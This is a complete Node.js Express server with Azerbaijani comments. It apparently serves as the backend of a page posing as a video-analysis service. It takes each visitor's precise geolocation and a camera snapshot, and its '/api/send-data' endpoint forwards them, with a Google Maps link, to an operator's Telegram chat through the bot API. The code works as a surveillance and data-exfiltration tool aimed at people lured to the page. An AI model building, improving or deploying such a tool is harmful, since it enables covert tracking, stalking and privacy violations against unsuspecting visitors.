const express = require('express');
const path = require('path');
const fetch = require('node-fetch'); // Node.js 18-dən köhnə versiyalar üçün
const FormData = require('form-data'); // Form-data göndərmək üçün
require('dotenv').config(); // .env fayllarını yükləmək üçün

const app = express();
const PORT = process.env.PORT || 3000;

// TELEGRAM_BOT_TOKEN və TELEGRAM_CHAT_ID dəyərləri .env faylından və ya Render.com-dan gələcək.
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Middleware
app.use(express.json({ limit: '50mb' })); // Gələn JSON məlumatını işləmək üçün (şəkil üçün limit artırıldı)
app.use(express.static(path.join(__dirname, 'public'))); // `public` qovluğunu statik fayllar üçün təyin edin

// Frontenddən gələn məlumatları qəbul edən API endpoint
app.post('/api/send-data', async (req, res) => {
    const { videoUrl, location, image } = req.body;
    console.log("Məlumat qəbul edildi. Lokasiya:", location ? 'Var' : 'Yoxdur', "Şəkil:", image ? 'Var' : 'Yoxdur');

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error("TELEGRAM_BOT_TOKEN və ya TELEGRAM_CHAT_ID təyin edilməyib.");
        return res.status(500).json({ message: "Server konfiqurasiya xətası. Lütfən, Render mühit dəyişənlərini yoxlayın." });
    }

    try {
        let messageText = `⚡️ *Yeni Video Analiz Girişi!* ⚡️\n\n`;
        messageText += `*Video URL:* ${videoUrl || 'Təyin edilməyib'}\n`;
        
        // Lokasiya məlumatı əlavə et
        if (location && location.latitude && location.longitude) {
            messageText += `*Lokasiya:* [Google Maps-də Gör] (https://www.google.com/maps?q=${location.latitude},${location.longitude})\n`;
            messageText += `  Enlem: ${location.latitude}\n`;
            messageText += `  Boylam: ${location.longitude}\n`;
            messageText += `  Dəqiqlik: ${location.accuracy ? location.accuracy + ' metr' : 'Təyin edilməyib'}\n`;
        } else {
            messageText += `*Lokasiya:* İstifadəçi tərəfindən rədd edildi və ya əldə edilmədi.\n`;
        }

        console.log("Telegrama göndərilən mətn mesajı:", messageText);
        // Telegrama mətn mesajı göndər
        const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown'
            })
        });

        if (!messageResponse.ok) {
            const errorData = await messageResponse.json();
            console.error("Telegrama mətn mesajı göndərilərkən xəta:", messageResponse.status, errorData);
            throw new Error(`Telegram mesaj xətası: ${errorData.description || 'Naməlum xəta'}`);
        }
        console.log("Mətn mesajı Telegrama uğurla göndərildi.");

        // Əgər şəkil varsa, şəkli Telegrama göndər
        if (image) {
            console.log("Şəkil məlumatı emal edilir...");
            const base64Data = image.replace(/^data:image\/\w+;base64,/, ""); // "data:image/jpeg;base64," hissəsini sil
            const imageBuffer = Buffer.from(base64Data, 'base64');

            const form = new FormData();
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('photo', imageBuffer, { filename: 'user_camera_capture.jpg', contentType: 'image/jpeg' });
            form.append('caption', `Kamera görüntüsü (${new Date().toLocaleString('az-AZ')})`);

            console.log("Şəkil üçün Telegram API-yə sorğu göndərilir...");
            const photoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: form,
                headers: form.getHeaders() 
            });

            if (!photoResponse.ok) {
                const errorData = await photoResponse.json();
                console.error("Telegrama şəkil göndərilərkən xəta:", photoResponse.status, errorData);
                throw new Error(`Telegram şəkil xətası: ${errorData.description || 'Naməlum xəta'}`);
            }
            console.log("Kamera görüntüsü Telegrama uğurla göndərildi.");
        }

        res.status(200).json({ message: "Məlumatlar uğurla qəbul edildi və Telegrama göndərildi." });

    } catch (error) {
        console.error("Məlumatları Telegrama göndərərkən ümumi xəta:", error);
        res.status(500).json({ message: "Məlumatları emal edərkən daxili server xətası: " + error.message });
    }
});

// Bütün digər sorğular üçün index.html-i qaytar
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serveri başlat
app.listen(PORT, () => {
    console.log(`Server ${PORT} portunda işləyir.`);
});
